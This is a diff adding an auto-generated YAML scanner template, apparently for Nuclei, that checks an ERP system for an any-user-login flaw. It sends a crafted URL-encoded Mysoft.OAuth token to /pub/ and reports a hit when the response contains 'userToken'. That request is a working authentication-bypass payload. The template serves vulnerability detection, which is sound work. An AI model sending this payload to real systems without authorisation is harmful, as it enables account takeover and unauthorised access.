@@ -1,0 +1,22 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-erp-anyuserlogin
+info:
+  name: "erp anyuserlogin"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, erp, ref-poc, anyuserlogin]
+  description: "由参考项目脚本静态导入：erp/anyuserlogin（类型 ANYUSERLOGIN）。 原脚本另含 favicon 指纹 ['383f3ea0be963d56cb16b012885261a4']，本引擎暂不支持 favicon 匹配。"
+http:
+  - method: GET
+    path:
+      - "/favicon.ico"
+      - "/pub/?Mysoft.OAuth=%36%6c%34%5a%57%78%75%2b%32%46%55%70%37%73%4a%58%4c%66%30%6d%6f%64%50%65%59%52%32%66%4d%45%46%42%54%76%74%4a%2f%6c%70%69%6d%33%44%4e%70%53%61%73%4f%62%52%53%61%41%44%66%5a%72%35%48%53%6e%37%34%72%2f%2b%76%2f%32%30%6e%47%64%6d%2f%53%78%46%78%55%77%37%65%5a%51%3d%3d"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "userToken"
